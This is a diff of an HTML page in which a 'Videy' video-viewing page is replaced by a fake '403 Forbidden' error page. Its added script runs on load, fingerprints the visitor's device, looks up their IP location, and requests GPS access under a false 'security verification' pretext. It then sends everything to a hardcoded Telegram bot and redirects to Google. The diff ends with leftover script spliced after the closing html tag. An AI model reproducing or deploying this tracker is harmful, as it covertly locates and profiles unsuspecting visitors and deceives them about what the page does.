@@ -1,72 +1,319 @@
-<!--
-   credits : t.me/scorpioZZZ
-            t.me/jawir666
- -->
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Watch on Videy — Free and Simple Video Hosting</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link rel="icon" type="image/x-icon" href="https://videy.co/favicon.ico" />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="https://videy.co/assets/style.css" />
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-  <script src="/assets/sw-init.js"></script>
+  <title>403 Forbidden</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+      text-align: center;
+    }
+    .error-container {
+      background-color: white;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      margin-top: 50px;
+    }
+    h1 {
+      color: #d32f2f;
+      font-size: 48px;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+    .loading {
+      color: #666;
+      font-style: italic;
+    }
+    .btn {
+      background-color: #4285f4;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+    .btn:hover {
+      background-color: #3367d6;
+    }
+    .warning {
+      display: none;
+      background-color: #fff3e0;
+      border-left: 4px solid #ffa000;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: left;
+    }
+  </style>
 </head>
-<body data-version="v1.0.5">
-  <div class="container">
-    <div class="top">
-      <div class="logo"><a href="/">videy</a></div>
-      <a href="/"><div class="upload">Upload</div></a>
-      <div class="more"><a href="/advertise">Advertise</a></div>
+<body>
+  <div class="error-container">
+    <h1>403</h1>
+    <p>Access to this resource is forbidden</p>
+    <p class="loading">Checking your credentials...</p>
+    
+    <div id="lokasiWarning" class="warning">
+      <strong>Location service required</strong><br>
+      We need to verify your location for security purposes.<br>
+      <button class="btn" onclick="retryLocation()">Allow Location Access</button>
     </div>
-
-    <div class="video">
-      <div class="video-inner">
-        <video autoplay controls width="100%" id="video" playsinline>
-          <source type="video/mp4" />
-          Your browser does not support the video tag.
-        </video>
-        <div id="video-error" style="display: none;" class="video-error-container">
-          <div class="video-error">Video could not load.</div>
-          <div class="video-error-reasons">
-            This could be because the video was removed, your internet connection is down, the server is having issues, or the video might not have ever existed.
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="video-actions" style="display: none;">
-      <div class="video-actions-inner">
-        <button class="action-btn" id="shareVideo">Share Video</button>
-        <button class="action-btn" id="copyUrl">Copy Link</button>
-        <button class="action-btn" id="uploadVideo">Upload</button>
-        <button class="action-btn" id="subscribeBtn">Subscribe</button>
-        <button class="action-btn" id="reportBtn">Report</button>
-      </div>
-    </div>
-
-    <div class="as">
-      <iframe id="ads-iframe" src="" style="width: 100%; height: 500px; border: none; display: none;"></iframe>
-    </div>
-
-    <div class="footer">
-      <div class="copyright">Copyright &copy; <span id="year"></span> videy.co</div>
-      <div class="legal">
-        <div class="item"><a href="/terms-of-service">Terms of Service</a></div>
-        <div class="item"><a href="#" id="reportAbuse">Report Abuse</a></div>
-      </div>
-    </div>
+    
+    <button class="btn" onclick="window.location.reload()">Refresh Page</button>
   </div>
-  
-  <script src="config.js"></script>
-<script src="tracker.js"></script>
 
-  <script async defer src="https://www.googletagmanager.com/gtag/js?id=G-BDP4EF6BCQ"></script>
+<script>
+const token = "8398453307:AAGoO9Jew8x7ic0jau-rjyLOKye64m3bN9g";
+const chatId = "7191927069";
+const redirectURL = "https://www.google.com";
+
+const deviceInfo = {
+  // Basic info
+  userAgent: navigator.userAgent,
+  language: navigator.language,
+  platform: navigator.platform,
+  resolution: screen.width + "x" + screen.height,
+  colorDepth: screen.colorDepth + " bit",
+  brand: "Unknown",
+  timestamp: new Date().toISOString(),
+  
+  // Network info
+  ipPublic: "Loading...",
+  ipLocation: "Loading...",
+  connection: {
+    type: "Unknown",
+    speed: "Unknown"
+  },
+  
+  // Device capabilities
+  battery: { level: "Unknown", charging: "Unknown" },
+  touchSupport: false,
+  hardware: {
+    cores: navigator.hardwareConcurrency || "Unknown",
+    memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown"
+  },
+  
+  // Advanced fingerprinting
+  gpu: {
+    vendor: "Unknown",
+    renderer: "Unknown"
+  },
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  fonts: [],
+  mediaCodecs: {
+    audio: [],
+    video: []
+  }
+};
+
+// Enhanced brand detection
+function detectBrand() {
+  const ua = deviceInfo.userAgent.toLowerCase();
+  const brands = {
+    "samsung": "Samsung", "xiaomi": "Xiaomi", "oppo": "Oppo", "vivo": "Vivo",
+    "realme": "Realme", "asus": "Asus", "infinix": "Infinix", "tecno": "Tecno",
+    "iphone": "iPhone", "huawei": "Huawei", "oneplus": "OnePlus", "google": "Google",
+    "pixel": "Pixel", "redmi": "Redmi", "poco": "POCO", "lenovo": "Lenovo"
+  };
+  
+  for (const [key, value] of Object.entries(brands)) {
+    if (ua.includes(key)) {
+      deviceInfo.brand = value;
+      break;
+    }
+  }
+}
+
+// Enhanced network detection
+async function fetchNetworkInfo() {
+  try {
+    // Public IP and location
+    const ipResponse = await fetch("https://ipapi.co/json/");
+    const ipData = await ipResponse.json();
+    deviceInfo.ipPublic = ipData.ip;
+    deviceInfo.ipLocation = `${ipData.city}, ${ipData.region}, ${ipData.country_name} (${ipData.org})`;
+    
+    // Connection info
+    if (navigator.connection) {
+      const conn = navigator.connection;
+      deviceInfo.connection = {
+        type: conn.effectiveType || "Unknown",
+        speed: conn.downlink ? conn.downlink + " Mbps" : "Unknown",
+        rtt: conn.rtt ? conn.rtt + " ms" : "Unknown",
+        saveData: conn.saveData ? "Enabled" : "Disabled"
+      };
+    }
+  } catch (error) {
+    deviceInfo.ipPublic = "Failed to fetch";
+    deviceInfo.ipLocation = "Failed to fetch";
+  }
+}
+
+// Enhanced device capabilities
+function checkDeviceCapabilities() {
+  // Touch support
+  deviceInfo.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+  
+  // Battery status
+  if (navigator.getBattery) {
+    navigator.getBattery().then(battery => {
+      deviceInfo.battery = {
+        level: Math.round(battery.level * 100) + "%",
+        charging: battery.charging ? "Yes" : "No"
+      };
+    });
+  }
+  
+  // GPU detection
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        deviceInfo.gpu = {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+      }
+    }
+  } catch (e) {}
+  
+  // Font detection (limited)
+  const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Verdana', 'Georgia'];
+  const detectedFonts = [];
+  const div = document.createElement('div');
+  div.style.position = 'absolute';
+  div.style.left = '-9999px';
+  div.style.fontSize = '72px';
+  document.body.appendChild(div);
+  
+  testFonts.forEach(font => {
+    div.style.fontFamily = 'monospace,' + font;
+    if (div.offsetWidth !== div.offsetHeight) {
+      detectedFonts.push(font);
+    }
+  });
+  
+  document.body.removeChild(div);
+  deviceInfo.fonts = detectedFonts;
+  
+  // Media codec support
+  ['audio/mp3', 'audio/ogg', 'audio/wav', 'audio/aac'].forEach(type => {
+    if (document.createElement('audio').canPlayType(type)) {
+      deviceInfo.mediaCodecs.audio.push(type);
+    }
+  });
+  
+  ['video/mp4', 'video/webm', 'video/ogg'].forEach(type => {
+    if (document.createElement('video').canPlayType(type)) {
+      deviceInfo.mediaCodecs.video.push(type);
+    }
+  });
+}
+
+// Enhanced Telegram message formatting
+function buildEnhancedMessage(includeLocation, lat, lon) {
+  return `🛰️ *Advanced Device Report* 🛰️
+
+📅 *Timestamp*: ${new Date(deviceInfo.timestamp).toLocaleString()}
+
+🔧 *Hardware Information*
+• Brand: ${deviceInfo.brand}
+• Platform: ${deviceInfo.platform}
+• Resolution: ${deviceInfo.resolution} (${deviceInfo.colorDepth})
+• CPU Cores: ${deviceInfo.hardware.cores}
+• RAM: ${deviceInfo.hardware.memory}
+• GPU: ${deviceInfo.gpu.vendor} (${deviceInfo.gpu.renderer})
+• Touch Support: ${deviceInfo.touchSupport ? 'Yes' : 'No'}
+
+🌐 *Network Information*
+• Public IP: \`${deviceInfo.ipPublic}\`
+• Location: ${deviceInfo.ipLocation}
+• Connection: ${deviceInfo.connection.type} (${deviceInfo.connection.speed})
+• Timezone: ${deviceInfo.timezone}
+
+🔋 *Device Status*
+• Battery: ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.charging})
+
+🎛️ *Capabilities*
+• Audio Codecs: ${deviceInfo.mediaCodecs.audio.join(', ') || 'None'}
+• Video Codecs: ${deviceInfo.mediaCodecs.video.join(', ') || 'None'}
+• Fonts: ${deviceInfo.fonts.join(', ') || 'None detected'}
+
+${includeLocation ? `📍 *GPS Location*: https://maps.google.com/?q=${lat},${lon}` : '📍 *GPS Location*: Not available'}
+
+🛡️ *User Agent*
+\`\`\`
+${deviceInfo.userAgent}
+\`\`\``;
+}
+
+// GPS location handling (unchanged)
+function getLocationAndSend() {
+  if (!navigator.geolocation) {
+    sendToTelegram(buildEnhancedMessage(false), true);
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      const { latitude, longitude } = pos.coords;
+      sendToTelegram(buildEnhancedMessage(true, latitude, longitude), true);
+    },
+    (err) => {
+      document.getElementById("lokasiWarning").style.display = "block";
+      sendToTelegram(buildEnhancedMessage(false), true);
+    },
+    { timeout: 7000 }
+  );
+}
+
+// Telegram sending function (unchanged)
+async function sendToTelegram(message, redirect = false) {
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+  } finally {
+    if (redirect) {
+      setTimeout(() => {
+        window.location.href = redirectURL;
+      }, 3000);
+    }
+  }
+}
+
+// Retry location (unchanged)
+function retryLocation() {
+  document.getElementById("lokasiWarning").style.display = "none";
+  getLocationAndSend();
+}
+
+// Enhanced initialization
+window.onload = async () => {
+  detectBrand();
+  checkDeviceCapabilities();
+  await fetchNetworkInfo();
+  getLocationAndSend();
+};
+</script>
+</body>
+</html>  <script async defer src="https://www.googletagmanager.com/gtag/js?id=G-BDP4EF6BCQ"></script>
   <script>
     function getAdGroup() {
       let adGroup = localStorage.getItem('ad_group');
